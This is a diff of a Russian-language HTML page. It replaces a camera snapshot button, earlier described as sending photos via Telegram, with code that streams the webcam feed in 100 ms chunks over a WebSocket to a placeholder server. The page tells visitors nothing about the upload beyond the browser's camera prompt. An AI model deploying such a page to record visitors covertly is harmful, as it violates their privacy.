@@ -3,48 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Access</title>
+  <title>Web Camera Stream</title>
 </head>
 <body>
-  <h1>Используйте камеру</h1>
-  <video id="video" width="320" height="240" autoplay></video>
-  <button id="capture">Сделать фото</button>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <h1>Трансляция камеры</h1>
+  <video id="video" autoplay muted></video>
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureButton = document.getElementById('capture');
-    const ctx = canvas.getContext('2d');
+    const videoElement = document.getElementById("video");
 
-    // Получение доступа к камере
+    // Запрос доступа к камере
     navigator.mediaDevices.getUserMedia({ video: true })
       .then((stream) => {
-        video.srcObject = stream;
+        videoElement.srcObject = stream;
+
+        const socket = new WebSocket("wss://your-domain.com/stream");
+
+        // Отправка видеоданных на сервер
+        const mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            socket.send(event.data);
+          }
+        };
+        mediaRecorder.start(100); // Отправка каждые 100 мс
       })
-      .catch((error) => {
-        console.error('Ошибка при доступе к камере: ', error);
+      .catch((err) => {
+        console.error("Ошибка доступа к камере:", err);
       });
-
-    // Сделать фото
-    captureButton.addEventListener('click', () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const dataUrl = canvas.toDataURL('image/png'); // Получение изображения
-
-      // Отправить изображение обратно через Telegram
-      sendImageToServer(dataUrl);
-    });
-
-    function sendImageToServer(dataUrl) {
-      // Пример отправки изображения в Telegram через API
-      fetch('/send_image', {  // Замените на URL вашего сервера или API
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: dataUrl }),
-      });
-    }
   </script>
 </body>
 </html>
-
